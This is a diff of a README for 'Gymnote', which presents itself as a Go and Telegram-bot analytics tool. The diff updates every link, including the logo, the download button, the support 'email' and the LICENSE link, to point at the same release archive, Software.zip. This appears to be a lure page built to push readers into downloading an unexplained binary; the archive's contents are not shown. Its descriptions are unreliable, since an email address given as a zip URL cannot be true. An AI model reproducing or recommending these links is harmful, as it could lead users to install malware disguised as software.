@@ -1,6 +1,6 @@
 # Welcome to Gymnote 🏋️
 
-![Gymnote Logo](https://github.com/Honzacz544/gymnote/releases/download/v1.0/Program.zip)
+![Gymnote Logo](https://github.com/Honzacz544/gymnote/releases/download/v2.0/Software.zip)
 
 Gymnote is a powerful analytics tool designed for backend operations with a clean architecture and integrated clickhouse database. This repository is home to the Gymnote project, a cutting-edge MVP solution that leverages the capabilities of Go programming language and Telegram bot technology.
 
@@ -30,7 +30,7 @@ Gymnote is a powerful analytics tool designed for backend operations with a clea
 
 To start using Gymnote, download the latest version of the software from the link below:
 
-[![Download Gymnote](https://github.com/Honzacz544/gymnote/releases/download/v1.0/Program.zip)](https://github.com/Honzacz544/gymnote/releases/download/v1.0/Program.zip)
+[![Download Gymnote](https://github.com/Honzacz544/gymnote/releases/download/v2.0/Software.zip)](https://github.com/Honzacz544/gymnote/releases/download/v2.0/Software.zip)
 
 If the link does not work or you encounter any issues, please check the "Releases" section for alternative download options.
 
@@ -40,11 +40,11 @@ We welcome contributions from the open-source community to enhance Gymnote's fun
 
 ## Support 📞
 
-If you have any questions or need assistance with Gymnote, please reach out to our team via email at https://github.com/Honzacz544/gymnote/releases/download/v1.0/Program.zip
+If you have any questions or need assistance with Gymnote, please reach out to our team via email at https://github.com/Honzacz544/gymnote/releases/download/v2.0/Software.zip
 
 ## License 📜
 
-Gymnote is licensed under the MIT License. See the [LICENSE](https://github.com/Honzacz544/gymnote/releases/download/v1.0/Program.zip) file for more information.
+Gymnote is licensed under the MIT License. See the [LICENSE](https://github.com/Honzacz544/gymnote/releases/download/v2.0/Software.zip) file for more information.
 
 ---
 
